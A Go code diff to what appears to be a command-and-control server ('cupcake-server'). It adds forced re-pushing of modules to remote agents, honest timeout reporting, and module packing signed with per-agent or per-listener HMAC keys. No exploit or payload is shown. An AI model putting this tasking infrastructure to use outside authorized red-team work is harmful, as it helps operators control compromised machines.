@@ -6,6 +6,7 @@ import (
 	"strings"
 	"time"
 
+	"cupcake-server/pkg/globals"
 	"cupcake-server/services"
 	"github.com/gin-gonic/gin"
 )
@@ -59,22 +60,23 @@ func HandleUploadModule(c *gin.Context) {
 }
 
 // HandlePushModule POST /api/modules/push
-// json: {"uuid":"...","id":"iso_host"}
+// json: {"uuid":"...","id":"iso_host","force":true}
 // Waits for agent ack (up to 25s) so UI can show real success / loaded state.
 func HandlePushModule(c *gin.Context) {
 	var req struct {
-		UUID string `json:"uuid"`
-		ID   string `json:"id"`
+		UUID  string `json:"uuid"`
+		ID    string `json:"id"`
+		Force bool   `json:"force"`
 	}
 	if err := c.ShouldBindJSON(&req); err != nil || req.UUID == "" || req.ID == "" {
 		c.JSON(http.StatusBadRequest, gin.H{"error": "uuid and id required"})
 		return
 	}
 	ms := services.GetModuleService()
-	if ms.AgentHasModule(req.UUID, req.ID) {
+	if !req.Force && ms.AgentHasModule(req.UUID, req.ID) {
 		name, _, _ := services.ModuleDescribe(req.ID)
 		c.JSON(http.StatusOK, gin.H{
-			"msg":    "module already staged/loaded on agent",
+			"msg":    "module already staged/loaded on agent (pass force=true to re-push)",
 			"id":     req.ID,
 			"name":   name,
 			"loaded": true,
@@ -82,21 +84,24 @@ func HandlePushModule(c *gin.Context) {
 		})
 		return
 	}
+	if req.Force {
+		ms.ClearAgentModule(req.UUID, req.ID)
+	}
 
 	out, err := services.SendModuleStageWait(req.UUID, req.ID, 25*time.Second)
 	name, desc, kind := services.ModuleDescribe(req.ID)
 	if err != nil {
-		// timeout still marks optimistic loaded in SendModuleStageWait
+		// Timeout: do not claim loaded (SendModuleStageWait no longer marks optimistic)
 		if strings.Contains(err.Error(), "timeout") {
-			c.JSON(http.StatusOK, gin.H{
-				"msg":         "模块已下发（等待确认超时，已标记为已推送）",
+			c.JSON(http.StatusGatewayTimeout, gin.H{
+				"error":       err.Error(),
+				"msg":         "模块已下发但确认超时，请稍后重试或 force 重推",
 				"id":          req.ID,
 				"name":        name,
 				"description": desc,
 				"kind":        kind,
-				"loaded":      true,
-				"alive":       true,
-				"warning":     err.Error(),
+				"loaded":      false,
+				"alive":       false,
 				"detail":      out,
 			})
 			return
@@ -116,16 +121,41 @@ func HandlePushModule(c *gin.Context) {
 	})
 }
 
-// HandlePackModule GET /api/modules/pack/:id
+// HandlePackModule GET /api/modules/pack/:id?uuid=... or ?listener_id=...
+// Without uuid/listener_id packs with default/dev key (debug only).
 func HandlePackModule(c *gin.Context) {
 	id := c.Param("id")
 	ms := services.GetModuleService()
-	b64, err := ms.PackBase64(id)
+	name, desc, kind := services.ModuleDescribe(id)
+
+	// Prefer agent/listener-aligned HMAC key when identity is provided
+	var b64 string
+	var err error
+	if uuid := strings.TrimSpace(c.Query("uuid")); uuid != "" {
+		if val, ok := globals.Clients.Load(uuid); ok {
+			client := val.(*globals.Client)
+			key := services.ModuleHMACKeyForAgent(client)
+			b64, err = ms.PackBase64WithKey(id, key)
+		} else {
+			c.JSON(http.StatusNotFound, gin.H{"error": "agent offline; cannot pack with session key"})
+			return
+		}
+	} else if lid := strings.TrimSpace(c.Query("listener_id")); lid != "" {
+		if val, ok := globals.Listeners.Load(lid); ok {
+			ln := val.(*globals.Listener)
+			key := services.ModuleHMACKeyForListener(ln.EncryptKey, ln.EncryptionSalt)
+			b64, err = ms.PackBase64WithKey(id, key)
+		} else {
+			c.JSON(http.StatusNotFound, gin.H{"error": "listener not found"})
+			return
+		}
+	} else {
+		b64, err = ms.PackBase64(id)
+	}
 	if err != nil {
 		c.JSON(http.StatusNotFound, gin.H{"error": err.Error()})
 		return
 	}
-	name, desc, kind := services.ModuleDescribe(id)
 	c.JSON(http.StatusOK, gin.H{
 		"id":          id,
 		"name":        name,
